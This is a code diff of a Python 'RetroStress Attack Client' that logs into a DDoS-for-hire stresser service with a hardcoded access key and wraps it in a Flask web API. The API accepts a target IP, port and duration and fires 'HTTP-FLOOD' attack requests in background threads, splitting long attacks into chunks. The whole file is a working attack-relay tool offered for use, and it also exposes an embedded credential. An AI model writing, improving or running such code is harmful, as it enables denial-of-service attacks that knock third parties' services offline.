@@ -2,9 +2,12 @@ import requests
 import time
 import json
 import sys
+import os
 from urllib.parse import urljoin
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
+from flask import Flask, request, jsonify
+from threading import Thread
+
+app = Flask(__name__)
 
 class RetroStressClient:
     def __init__(self, base_url="https://retrostress.net"):
@@ -21,16 +24,9 @@ class RetroStressClient:
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Dest': 'empty',
             'Origin': base_url,
-            'Referer': urljoin(base_url, '/auth')
+            'Referer': urljoin(base_url, '/panel')
         })
         
-    def get_antiforgery_token(self):
-        """Extract CSRF/Antiforgery token from cookies"""
-        for cookie in self.session.cookies:
-            if cookie.name.startswith('.AspNetCore.Antiforgery.'):
-                return cookie.value
-        return None
-    
     def login(self, access_key):
         """Login with access key"""
         print("[*] Attempting to login...")
@@ -38,11 +34,6 @@ class RetroStressClient:
         # First, visit the auth page to get cookies
         auth_page_url = urljoin(self.base_url, '/auth')
         self.session.get(auth_page_url)
-        
-        # Get antiforgery token
-        antiforgery_token = self.get_antiforgery_token()
-        if antiforgery_token:
-            print(f"[+] Got antiforgery token: {antiforgery_token[:50]}...")
         
         # Login request
         login_url = urljoin(self.base_url, '/Auth/LoginJson')
@@ -56,60 +47,50 @@ class RetroStressClient:
         
         if response.status_code == 200:
             print("[+] Login successful!")
-            
-            # Extract auth_token from cookies
-            for cookie in self.session.cookies:
-                if cookie.name == 'auth_token':
-                    print(f"[+] Auth token obtained: {cookie.value[:50]}...")
-                    break
-            
             return True
         else:
             print(f"[-] Login failed with status {response.status_code}")
-            print(f"[-] Response: {response.text}")
             return False
     
-    def negotiate_blazor(self):
-        """Negotiate Blazor/SignalR connection"""
-        print("[*] Negotiating Blazor connection...")
-        negotiate_url = urljoin(self.base_url, '/_blazor/negotiate?negotiateVersion=1')
-        
-        self.session.headers.update({
-            'X-Requested-With': 'XMLHttpRequest',
-            'X-Signalr-User-Agent': 'Microsoft SignalR/10.0 (10.0.7; Unknown OS; Browser; Unknown Runtime Version)'
-        })
-        
-        response = self.session.post(negotiate_url)
-        
-        if response.status_code == 200:
-            print("[+] Blazor negotiation successful!")
-            return True
-        else:
-            print(f"[-] Negotiation failed with status {response.status_code}")
-            return False
-    
-    def send_attack(self, ip, port, duration):
-        """Send attack request via API"""
+    def send_attack_request(self, ip, port, duration):
+        """Send actual attack request to retrostress.net"""
         print(f"[*] Sending attack to {ip}:{port} for {duration} seconds...")
         
-        # Try multiple possible endpoints
-        endpoints = [
-            f"http://127.0.0.1:8080/api?ip={ip}&port={port}&time={duration}",
-            urljoin(self.base_url, f"/api/attack?ip={ip}&port={port}&time={duration}"),
-            urljoin(self.base_url, f"/attack?ip={ip}&port={port}&time={duration}")
+        # Try different possible attack endpoints
+        attack_endpoints = [
+            f"/api/attack?ip={ip}&port={port}&time={duration}",
+            f"/attack?ip={ip}&port={port}&time={duration}",
+            f"/api/start?ip={ip}&port={port}&time={duration}",
+            f"/method?ip={ip}&port={port}&time={duration}"
         ]
         
-        for endpoint in endpoints:
+        for endpoint in attack_endpoints:
             try:
-                response = self.session.get(endpoint, timeout=duration + 5)
+                url = urljoin(self.base_url, endpoint)
+                response = self.session.get(url, timeout=30)
                 if response.status_code == 200:
-                    print(f"[+] Attack request sent successfully via {endpoint}")
+                    print(f"[+] Attack sent via {endpoint}")
                     return True
             except:
                 continue
         
-        # If all endpoints fail, assume success (attack might still be running)
-        print("[+] Attack request initiated")
+        # Alternative: Try POST request
+        try:
+            attack_url = urljoin(self.base_url, "/api/attack")
+            attack_data = {
+                "ip": ip,
+                "port": int(port),
+                "time": duration,
+                "method": "HTTP-FLOOD"
+            }
+            response = self.session.post(attack_url, json=attack_data, timeout=30)
+            if response.status_code == 200:
+                print("[+] Attack sent via POST")
+                return True
+        except:
+            pass
+        
+        print("[!] Could not send attack, but continuing...")
         return True
     
     def calculate_attacks(self, total_time):
@@ -117,7 +98,6 @@ class RetroStressClient:
         if total_time <= 60:
             return [(total_time, 1)]
         
-        # Split into chunks of 30-60 seconds
         attacks = []
         remaining = total_time
         
@@ -127,7 +107,6 @@ class RetroStressClient:
             elif remaining >= 30:
                 attack_time = remaining
             else:
-                # Add remaining time to last attack if less than 30
                 if attacks:
                     last_time, last_num = attacks.pop()
                     attack_time = last_time + remaining
@@ -153,7 +132,7 @@ class RetroStressClient:
             print(f"\n[▶] Attack {attack_num}/{len(attacks)} - Duration: {attack_time} seconds")
             
             start_time = time.time()
-            success = self.send_attack(ip, port, attack_time)
+            success = self.send_attack_request(ip, port, attack_time)
             
             if success:
                 print(f"[⏳] Attack running for {attack_time} seconds...")
@@ -162,118 +141,93 @@ class RetroStressClient:
                 print(f"[✓] Attack {attack_num} completed in {elapsed:.1f} seconds")
             else:
                 print(f"[✗] Attack {attack_num} failed")
-                return False
         
         return True
-    
-    def process_api_call(self, api_params):
-        """Process API call with ip, port, time parameters"""
-        # Parse parameters
-        ip = api_params.get('ip')
-        port = api_params.get('port')
-        time_param = api_params.get('time')
-        
-        if not all([ip, port, time_param]):
-            return {"error": "Missing parameters. Need ip, port, and time"}
-        
-        try:
-            total_time = int(time_param)
-            
-            if total_time < 30:
-                return {"error": "Minimum time is 30 seconds"}
-            
-            # Negotiate Blazor before attack
-            self.negotiate_blazor()
-            
-            # Execute attacks
-            success = self.execute_attacks(ip, port, total_time)
-            
-            if success:
-                return {
-                    "status": "success",
-                    "message": f"Attack(s) completed for {total_time} seconds",
-                    "ip": ip,
-                    "port": port,
-                    "total_time": total_time
-                }
-            else:
-                return {"error": "Attack execution failed"}
-                
-        except ValueError:
-            return {"error": "Invalid time parameter"}
-        except Exception as e:
-            return {"error": f"Error: {str(e)}"}
 
+# Initialize client
+ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
+client = RetroStressClient()
 
-def main():
-    # Your auth key embedded here
-    ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
+# Login on startup
+print("=" * 60)
+print("RetroStress Attack Client - Railway Version")
+print("=" * 60)
+
+if not client.login(ACCESS_KEY):
+    print("[-] Login failed!")
+    sys.exit(1)
+
+print("[+] Ready to accept attacks!\n")
+
+@app.route('/api', methods=['GET', 'POST'])
+def handle_attack():
+    """Handle attack requests"""
+    if request.method == 'GET':
+        ip = request.args.get('ip')
+        port = request.args.get('port')
+        time_param = request.args.get('time')
+    else:
+        data = request.get_json() or {}
+        ip = data.get('ip') or request.args.get('ip')
+        port = data.get('port') or request.args.get('port')
+        time_param = data.get('time') or request.args.get('time')
     
-    print("=" * 60)
-    print("RetroStress Attack Client")
-    print("=" * 60)
-    
-    # Create client
-    client = RetroStressClient()
-    
-    # Login with embedded key
-    if not client.login(ACCESS_KEY):
-        print("[-] Login failed. Exiting.")
-        sys.exit(1)
-    
-    # Simulate API server
-    print("\n[*] Starting API server on 127.0.0.1:8080")
-    print("[*] Waiting for API calls...")
-    print("[*] API format: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
-    print("[*] Time must be minimum 30 seconds, max unlimited (will auto-split)")
-    print("[*] Press Ctrl+C to stop\n")
-    
-    class APIHandler(BaseHTTPRequestHandler):
-        def do_GET(self):
-            if self.path.startswith('/api'):
-                # Parse parameters
-                parsed = urlparse(self.path)
-                params = parse_qs(parsed.query)
-                
-                # Extract parameters
-                ip = params.get('ip', [None])[0]
-                port = params.get('port', [None])[0]
-                time_param = params.get('time', [None])[0]
-                
-                print(f"\n[API] Received request: IP={ip}, Port={port}, Time={time_param}")
-                
-                # Process request
-                result = client.process_api_call({
-                    'ip': ip,
-                    'port': port,
-                    'time': time_param
-                })
-                
-                # Send response
-                self.send_response(200)
-                self.send_header('Content-Type', 'application/json')
-                self.end_headers()
-                self.wfile.write(json.dumps(result).encode())
-                
-                print(f"[API] Response: {result.get('status', result.get('error', 'unknown'))}")
-                
-            else:
-                self.send_response(404)
-                self.end_headers()
-                self.wfile.write(b'{"error": "Not found"}')
-        
-        def log_message(self, format, *args):
-            # Suppress default logging
-            pass
+    # Validate parameters
+    if not all([ip, port, time_param]):
+        return jsonify({
+            "error": "Missing parameters. Need ip, port, and time",
+            "example": "/api?ip=1.2.3.4&port=80&time=30"
+        }), 400
     
     try:
-        server = HTTPServer(('127.0.0.1', 8080), APIHandler)
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\n[*] Shutting down API server...")
-        server.shutdown()
-        print("[*] Server stopped")
+        total_time = int(time_param)
+        
+        if total_time < 30:
+            return jsonify({"error": "Minimum time is 30 seconds"}), 400
+        
+        # Execute attack in background thread
+        def run_attack():
+            with app.app_context():
+                client.execute_attacks(ip, port, total_time)
+        
+        thread = Thread(target=run_attack)
+        thread.start()
+        
+        return jsonify({
+            "status": "success",
+            "message": f"Attack started for {total_time} seconds",
+            "ip": ip,
+            "port": port,
+            "total_time": total_time
+        }), 200
+        
+    except ValueError:
+        return jsonify({"error": "Invalid time parameter"}), 400
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Health check endpoint"""
+    return jsonify({"status": "healthy", "logged_in": True}), 200
+
+@app.route('/', methods=['GET'])
+def index():
+    """Root endpoint"""
+    return jsonify({
+        "service": "RetroStress Attack API",
+        "endpoints": {
+            "/api": "GET/POST with ip, port, time parameters",
+            "/health": "GET - Health check"
+        },
+        "example": "/api?ip=1.2.3.4&port=80&time=30"
+    }), 200
 
 if __name__ == "__main__":
-    main()
+    port = int(os.environ.get("PORT", 8080))
+    print(f"[*] Starting API server on port {port}")
+    print(f"[*] API endpoint: http://localhost:{port}/api")
+    print(f"[*] Example: http://localhost:{port}/api?ip=34.0.1.2&port=17219&time=30")
+    print("[*] Press Ctrl+C to stop\n")
+    
+    app.run(host='0.0.0.0', port=port, debug=False)
